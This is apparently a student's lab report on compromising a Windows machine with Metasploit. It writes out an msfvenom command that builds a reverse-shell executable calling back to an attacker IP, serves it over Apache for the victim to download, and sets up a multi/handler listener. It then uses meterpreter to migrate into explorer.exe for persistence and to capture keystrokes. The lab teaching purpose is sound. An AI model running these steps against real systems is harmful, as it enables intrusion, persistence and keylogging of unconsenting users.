# Compromising-windows-using-Metasploit
# Name : Senthil Raj G
# Register NO : 212224100054
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="754" height="409" alt="Screenshot From 2026-02-13 09-49-19" src="https://github.com/user-attachments/assets/85e97322-ada9-42a9-8cb8-a4b853f36d1d" />

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

<img width="736" height="205" alt="Screenshot From 2026-02-13 09-58-27" src="https://github.com/user-attachments/assets/20dac529-0f3b-40f7-b406-e10f443d0c3c" />

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

<img width="283" height="64" alt="Screenshot From 2026-02-13 09-58-35" src="https://github.com/user-attachments/assets/7bcaf93a-2b68-4eec-a4ab-fe033c0a581b" />

Start apache server
sudo systemctl apache2 start
Check the status of apache2
## OUTPUT:

<img width="610" height="552" alt="Screenshot From 2026-02-13 09-58-59" src="https://github.com/user-attachments/assets/e84efed4-8365-4677-aca8-f12dad155570" />

Invoke msfconsole:
## OUTPUT:

<img width="656" height="607" alt="Screenshot From 2026-02-13 09-59-10" src="https://github.com/user-attachments/assets/b9d67980-2d29-4e0b-b2d8-c80966746c9b" />

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:

<img width="737" height="670" alt="Screenshot From 2026-02-13 09-59-21" src="https://github.com/user-attachments/assets/d8819ae6-70a4-4489-a7ef-54cc256c558d" />

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

<img width="603" height="133" alt="Screenshot From 2026-02-13 10-00-19" src="https://github.com/user-attachments/assets/b1357901-9234-4332-ad3d-9c17ca4cd5e8" />

Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="402" height="133" alt="Screenshot 2026-02-13 100126" src="https://github.com/user-attachments/assets/1f534b3c-c7c4-4c85-8108-79a81517fa70" />

On kali/parrot give the command exploit
## OUTPUT:

<img width="865" height="194" alt="Screenshot From 2026-02-13 09-59-40" src="https://github.com/user-attachments/assets/caf527f0-687e-4624-a3c9-a83fa1bd06d2" />

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:

<img width="1447" height="328" alt="Screenshot From 2026-02-13 10-00-32" src="https://github.com/user-attachments/assets/b59b59f1-24dc-40db-9c4b-505d913bec1c" />

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:

<img width="618" height="370" alt="image" src="https://github.com/user-attachments/assets/43ba0980-3531-4057-8b52-e23093b0dc1a" />

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:

<img width="479" height="66" alt="image" src="https://github.com/user-attachments/assets/e190dbed-37c8-4252-a1d3-7e77a273e492" />

keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:

<img width="595" height="236" alt="image" src="https://github.com/user-attachments/assets/19491175-2daf-4619-aaee-712a4fa9ae6e" />

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
